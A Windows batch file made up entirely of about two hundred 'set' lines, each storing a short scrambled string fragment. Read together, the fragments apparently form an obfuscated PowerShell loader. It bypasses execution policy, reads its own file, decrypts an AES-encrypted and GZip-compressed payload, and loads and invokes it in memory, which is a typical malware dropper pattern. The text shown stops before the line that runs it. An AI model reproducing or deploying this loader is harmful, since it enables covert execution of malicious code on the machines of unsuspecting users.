@echo off
set "fPZLUgBGkt=Comp"
set "CHGJQfPNpC=;$fK"
set "lmaNUqhheE=em.C"
set "AWnbJTpvdE=gjYA"
set "AyiTFJuHxh=h) {"
set "iqhAWeAmLL=PCe."
set "TaWMvIpcxE=Iii."
set "rEfwjQLcWL=e]::"
set "XoVNOSXbzz==');"
set "RsqgoCPuUO=orF'"
set "mNmqPIJqyp=FeRz"
set "FwJAmoTQuB=YxVw"
set "RWrbpariiu=oryS"
set "tnXQTGDfMz=ing("
set "mqRGDGRZbs=)($O"
set "GOVJuaXalr=ect "
set "EhVmSuTSDQ=m.IO"
set "ukVHwlfIoX=FeRz"
set "SjMCIuVlTC= = $"
set "FbCfvSFucn=V = "
set "AHNZWIUFRr=;$Mf"
set "bTuKPnkfXA='[-1"
set "QnqPmbrpbg=6] -"
set "hvkLAVfsRm=;$Mf"
set "meEsPEpYhz=e = "
set "QDSscwtKDU= = N"
set "wbqYHdPYKv=ress"
set "uSbnpmQwCa=oArr"
set "aelYxURZxg=.Mem"
set "gJYyftJjWH=::('"
set "pWnDEOcJkF=('da"
set "nMIsKGQjbT=eMVs"
set "eMiuESqGEk=daeR"
set "rAEWIEFwwr=t = "
set "iyvHxzGhOZ=oL'["
set "ZhZoJtmDCF=ew-O"
set "gLHjkLePDv=qPO."
set "MilLqeTAuH= '')"
set "mUoOwHBzhr=TJ);"
set "dImrRugPNx=bjec"
set "XhITraICIG=pStr"
set "MiKRYnHxyA=($WG"
set "ErmWOgxfue=Comp"
set "jfWNtlrGPm=tion"
set "byWLmpVKaL=Secu"
set "WSPpWnSNPC=u, 0"
set "ZLrUjTqscy=g = "
set "ikfiRYfTWn=form"
set "fvykyNHpnf=ddin"
set "bKXEIDCfNu=Ydqu"
set "ZHWECcXaCN=-ep "
set "wjKykkEIQd='txe"
set "PhDJZponQp=ress"
set "LbPtlvakVC=gMod"
set "xaAXYZBzpE=Invo"
set "bDfogtPgqS===')"
set "ZdMoGSVtXz=ose("
set "TfQOMeIOoZ=gYdq"
set "aTvnuFSMAf=l = "
set "sQQSdtSyWT=trea"
set "hOYGfpJrHn=$MfP"
set "LMsFZEgApc=ode]"
set "BCveIdkuKi=gYdq"
set "EAiJkwBSFj=tem."
set "rIFZMiwBok=[Sys"
set "wLmWzQDZnZ=();$"
set "PfBZmCUSPq=BC;$"
set "iOYNpKjWbw=);$s"
set "EEBpsZpkLP=16] "
set "ZjTnsbWYMr=::De"
set "PAZIQKbqUs=1] -"
set "XhZKaiqUzF=le  "
set "DqxKDiWecA= [st"
set "YhqULrzOYI=yste"
set "zArRQBXZdy=$gYd"
set "ESGRJtSsOj=stem"
set "MegDaZSeoX=lit("
set "YWizYUrPEb=nage"
set "ObSRIjVMyf=ptog"
set "kGbsDIyyDn=n ''"
set "zTmDzdiCHt=bstr"
set "wVEiLBUmfe=File"
set "QlGTUgrILp=join"
set "ZYQtwjLrjX='gni"
set "xBMrOFOdhV=.Mod"
set "XNmwecIkXq=PxEW"
set "zLsdAQSMKV=Iii "
set "rAtIqDYBgE='[-1"
set "GTUQvJyGXA=] -j"
set "wEysDmfBPx=pres"
set "EtYAvYdtUi=Bmor"
set "tsaeGbTgTi=PTtG"
set "zYBmCNKXgw=Disp"
set "UmdVEZWSPX=dDmH"
set "YqxJVLWsIl=i.Su"
set "rzpxWKbrLJ=-joi"
set "IRqJEYiYBn=raph"
set "tBsVblcvHx=y.Cr"
set "hxVdnHfRUS=in $"
set "DRPFxjWcAJ= = $"
set "cRDKehEJuo=-1.."
set "iFskiXSahU=rity"
set "VmEUzJRHvB=gsYZ"
set "EWUcwHumUH= = ["
set "iwZjiLaEAi=y]::"
set "WTjPgoOWAp=:: '"
set "XlvcZaNKjo=..-1"
set "UOGxauQdqT=PKCS"
set "vAxZQJgRBF=[IO."
set "gNfzIErbJX=null"
set "iAIMGCuLMP=ion."
set "tVVrnpBOmz=[Env"
set "rxNTwzlRlO=ptog"
set "zawyYnugJM=3); "
set "nCUfQXIJED=hmGN"
set "VVmzLYUedK=$Ohm"
set "NJvKKqzbao=New-"
set "UYeGblnIEG=join"
set "ktotrCYYgx=F'[-"
set "NoamtLSyOI=ddin"
set "TYEUXhddwh=comm"
set "ouFhqNItTf=u = "
set "ZlssjOuxFY=tem."
set "yaNwxJeCFo=Ydqu"
set "PeqXlkCYLA=gth)"
set "vSuxTdFTXO= New"
set "dWbgaONpWr== [S"
set "bWiWnAohTP=th('"
set "tQPSlSQoAo=ne);"
set "kKzOYtizdf=embl"
set "RKbZkHcKyv=.Con"
set "JcSUgPTIFP=$gYd"
set "MyhnoUELCC=TJ.T"
set "bFXmdTtDgJ=$qmY"
set "lpgEfczdtM=.Dis"
set "LBfHQZyTpv=ment"
set "OWJvyFlibm=rt]:"
set "CWCgPDUjtf=hy.A"
set "jFGfpKVbou=ring"
set "pvKOSOEaRs=yste"
set "UYheCqqxzR=  $O"
set "UMruEvYkCL= [Sy"
set "wUPeDRUQaz=();$"
set "aVohewWCrE=ecry"
set "VmOfrXvDMo=jnsi"
set "hbAjdYiDtI=106u"
set "kyckrFKNpK=[Sys"
set "pYlUJJgqvc=oint"
set "gJkTBCMsyC=7;$O"
set "MKpSYVxFKt=dj0C"
set "uJRvUUthdT=Conv"
set "hRFjLzxOEl=; };"
set "fEIGcrkdMF=mory"
set "rBOyutFcov=iron"
set "CmTyutBWSS=L4Yi"
set "MSxBqcfeGL=rans"
set "EQQySjSdAX=-nop"
set "wKNzbrVuPU=Et.D"
set "TXosRZYMbC=Ce.T"
set "TjozIUDgkb=Mode"
set "fTQBgysCzx=n ''"
set "NezbCyaRXf=gYdq"
set "iRUtKVzRKQ=zHhH"
set "mqUABzCHJN=.Cry"
set "etDubBnYbR=Syst"
set "SoqMjixwOz=$sbG"
set "ojrPEOPofq=tem."
set "bIxiPtHYqK== $O"
set "eaKrVSyYbC=TJ ="
set "tzbPAXhJgC=ert]"
set "UIERJLosac=$qmY"
set "xNCZznmYOt=il, "
set "ZXOChKCyjx=ke($"
set "eqPkwyfmJa=New-"
set "nyuNrJrPxt=Star"
set "lwYVRRkEkC=ateD"
set "wzmMNtKQln=Disp"
set "XUMqrWLyqK=vert"
set "GCwtPfwOwW=-Obj"
set "PqRTaBfpuO=.-16"
set "TvtRRwOipo=pher"
set "gQefIEDGVS=Stre"
set "HIDSdlWmED=, $g"
set "QUZqwKhJtf=$dDm"
set "nREAGCgPNf=;$ga"
set "lDhQboqsYS=mYTJ"
set "bjXXbeOrYQ=.GZi"
set "lklvulJXWZ=morF"
set "TuwYhLrtKe=]::C"
set "yhPeSAGHpx=gnir"
set "LpssHjZFKr=Syst"
set "vDgsDkNXkv=u = "
set "eAOVKqBDbo=qu ="
set "lUkFGYgPaN=).Sp"
set "DTNsTPpuWA=('%*'"
set "VVwNZYltXO=KqPO"
set "eFxpuBUMUf=('%~f0'"
set "hgQehkswPl=ose("
set "psdgvvzwfc=eam("
set "fnXKjlkexF=);$f"
set "vjTyiQxoje=GN.I"
set "uVSgtddgGf=sion"
set "DBLKXKEwkN=y.Pa"
set "lJAaNZzxQT=RmAx"
set "lYszAVcBNr=ct S"
set "PVrrsoqxpd=lBlo"
set "ctdDuUVjdu=$qmY"
set "MXaiYUVrxR=m(, "
set "AlUoylVHtu= if "
set "ZAmyGYSUFo=.Cop"
set "mpLNlTIexq=[-1."
set "IYLRqWFjbO=ay()"
set "vVMOjdjEwo=('Tg"
set "mCKwrAjDSl=tS46"
set "ErNZEBhJKQ=, (,"
set "ESdndYDjMJ=);$O"
set "huaHXNzylO=onve"
set "JvqAFsVgif=:('g"
set "qVVAXhLNCo=1..-"
set "KzUDcsJyUC=ispo"
set "eIttTyVEvr=TllA"
set "eZgRVLezbF=saBm"
set "qBGUVFlUOO=d;$O"
set "uoYcCkWWMt=.Cre"
set "fWTcfCDtNx=esMa"
set "JzkDqaVAON=grap"
set "vbgWRHFpRl=s75K"
set "wrQfWVysuN=yste"
set "XIZPsFrSIA=se()"
set "aIshkkotUd=qu);"
set "gAhRghzCJn=l5E7"
set "wHywWbNnwa=am;$"
set "JGobvXvTeI=;$jn"
